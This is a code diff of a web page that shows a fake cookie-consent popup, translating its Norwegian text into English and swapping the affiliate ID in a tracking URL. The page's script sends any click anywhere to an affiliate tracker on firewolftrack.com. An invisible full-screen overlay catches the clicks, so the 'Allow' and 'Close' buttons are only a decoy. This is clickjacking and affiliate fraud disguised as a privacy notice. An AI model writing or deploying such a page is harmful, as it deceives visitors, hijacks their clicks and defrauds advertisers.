@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="no">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,7 +15,6 @@ body {
   font-family: Arial, sans-serif;
 }
 
-/* overlay */
 #overlay {
   position: fixed;
   top:0;
@@ -29,7 +28,6 @@ body {
   z-index:9999;
 }
 
-/* popup */
 .popup {
   background: #f9fafb;
   padding: 30px 25px;
@@ -91,21 +89,21 @@ button {
 
 <div id="overlay">
   <div class="popup">
-    <h2>Informasjonskapsler</h2>
+    <h2>Cookies</h2>
     <p>
-      Dette nettstedet bruker informasjonskapsler for å tilpasse innhold og annonser,
-      tilby funksjoner for sosiale medier og analysere trafikken vår. Ved å klikke på
-      «Tillat», samtykker du til bruk av informasjonskapsler. For mer informasjon,
-      se våre retningslinjer for informasjonskapsler.
+      This website uses cookies to personalize content and ads,
+      provide social media features, and analyze our traffic.
+      By clicking "Allow", you consent to the use of cookies.
+      For more information, see our cookie policy.
     </p>
 
     <div class="buttons">
-      <button class="accept">Tillat</button>
-      <button class="close">Lukk</button>
+      <button class="accept">Allow</button>
+      <button class="close">Close</button>
     </div>
 
     <div class="footer">
-      Ditt personvern er viktig for oss
+      Your privacy is important to us
     </div>
   </div>
 </div>
@@ -116,7 +114,7 @@ function getAffiliateUrl(baseUrl) {
 }
 
 document.addEventListener("DOMContentLoaded", () => {
-  const baseUrl = "https://www.firewolftrack.com/2ZWCMC65/22N1XNW9/";
+  const baseUrl = "https://www.firewolftrack.com/2ZWCMC65/224RLGXW/";
   let clicked = false;
 
   function redirect() {
@@ -131,10 +129,8 @@ document.addEventListener("DOMContentLoaded", () => {
     a.click();
   }
 
-  // qualquer clique
   document.body.addEventListener("click", redirect);
 
-  // overlay invisível (garantia total)
   const overlay = document.createElement("div");
   overlay.style.cssText = `
     position:fixed;
